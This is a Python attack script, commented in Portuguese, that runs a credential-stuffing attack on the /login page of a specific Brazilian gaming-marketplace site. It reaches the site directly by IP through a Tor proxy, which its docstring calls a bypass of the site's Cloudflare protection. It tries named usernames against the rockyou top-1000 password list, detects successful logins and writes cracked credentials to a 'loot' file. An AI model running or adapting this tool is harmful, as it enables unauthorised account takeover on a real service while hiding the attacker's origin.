#!/usr/bin/env python3
"""
PIVOT RODADA 2 — /login publico cred stuffing com rockyou top 1000.
/login SEM reCAPTCHA (F-014) + bypass CF (sem WAF). Sucesso = HTTP 302/303
(redirect p/ painel) ou body sem "nao confere". Nao-destrutivo.
"""
import sys, time, random, requests, urllib3, re, json
from datetime import datetime
urllib3.disable_warnings()
PROXY={"https":"socks5://127.0.0.1:9050","http":"socks5://127.0.0.1:9050"}
URL="https://186.226.60.54/login"
HOSTH="desapegogames.com.br"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"

USERNAMES=[
    "administrador","adminv","dev1ce","devaashe","masterx","diegobtrindade",
    "desapegostore","diego047","comercial",
]

def load_wordlist(path):
    with open(path,encoding="utf-8",errors="replace") as f:
        return [l.rstrip("\n") for l in f if l.strip()]

def main():
    wlp="/tmp/opencode/pivot/rockyou_top1000.txt"
    passwords=load_wordlist(wlp)
    out="enum/pivot_login_credstuff_rockyou.log"
    f=open(out,"w")
    def log(m):
        ts=datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
        line=f"{ts} {m}"
        print(line,flush=True); f.write(line+"\n"); f.flush()
    log(f"[*] PIVOT /login cred stuffing — {len(USERNAMES)} users x {len(passwords)} passes = {len(USERNAMES)*len(passwords)} tentativas (rockyou top1000)")
    log(f"[*] Sucesso = HTTP 302/303 OU body sem 'nao confere' + cookie ci_session set")
    tried=0; hits=[]
    for user in USERNAMES:
        for pw in passwords:
            tried+=1
            sess=requests.Session(); sess.proxies.update(PROXY)
            try:
                r=sess.post(URL,headers={"Host":HOSTH,"User-Agent":UA},
                            data={"login":user,"senha":pw},
                            verify=False,timeout=30,allow_redirects=False)
                body=r.content
                fail=b"confere" in body or b"incorret" in body or b"invalid" in body
                # sucesso: redirect 302/303 OU body sem msg de erro
                success = (r.status_code in (301,302,303,307,308)) or (not fail and r.status_code==200 and b"painel" in body.lower())
                cookie_set = "ci_session" in r.headers.get("Set-Cookie","") and "ci_session" not in r.request.headers.get("Cookie","")
                if success or (r.status_code in (301,302,303,307) and not fail):
                    loc=r.headers.get("Location","")
                    log(f"  [{tried:05d}] *** POSSIVEL SUCCESS *** {user!r}:{pw!r} -> HTTP {r.status_code} loc={loc} cookie={cookie_set}")
                    hits.append((user,pw,r.status_code,loc,cookie_set))
                else:
                    if tried%100==0:
                        log(f"  [{tried:05d}] {user!r}:{pw!r} -> FAIL HTTP {r.status_code} fail={fail}")
            except Exception as e:
                log(f"  [{tried:05d}] {user!r}:{pw!r} -> EXC {type(e).__name__}: {e}")
                time.sleep(5)
            time.sleep(random.uniform(1.0,2.0))
    log(f"\n=== RESULTADO PIVOT LOGIN CREDSTUFF ROCKYOU ===")
    log(f"Total tentativas: {tried}")
    log(f"Possiveis sucessos: {len(hits)}")
    for u,p,st,loc,ck in hits:
        log(f"  HIT: {u!r}:{p!r} status={st} loc={loc} cookie={ck}")
    if hits:
        log(f"\n[+] Cred(s) obtida(s) — mapear /painel/*.")
        with open("loot/login_creds_rockyou.txt","w") as lf:
            for u,p,st,loc,ck in hits:
                lf.write(f"{u}:{p}\n")
    else:
        log(f"[-] Nenhum sucesso com rockyou top1000.")
    f.close()
    return hits

if __name__=="__main__":
    main()
